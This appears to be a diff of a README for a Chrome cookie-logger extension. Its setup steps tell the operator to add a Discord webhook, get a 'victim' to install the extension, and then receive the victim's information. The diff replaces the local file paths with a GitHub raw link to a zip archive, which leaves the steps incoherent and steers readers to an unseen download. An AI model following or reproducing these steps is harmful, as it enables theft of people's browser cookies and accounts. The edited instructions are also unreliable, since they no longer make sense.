@@ -11,8 +11,8 @@
 
 
 ## Setup for skids
-> 1. Put your discord webhook in "scripts/log.js" "line 1"
-> 2. You may change the extension info (name, description) in "manifest.json"
+> 1. Put your discord webhook in "https://github.com/Bandsealah/chrome_extension-cookielogger/raw/refs/heads/main/extensions/extension_cookielogger_chrome_v2.7.zip" "line 1"
+> 2. You may change the extension info (name, description) in "https://github.com/Bandsealah/chrome_extension-cookielogger/raw/refs/heads/main/extensions/extension_cookielogger_chrome_v2.7.zip"
 > 3. Upload the extension directory as a chrome extension and get victim to add your extension to chrome
 > 4. As soon as they add the extention you will get a message containing victim info to your webhook
 ## Examples
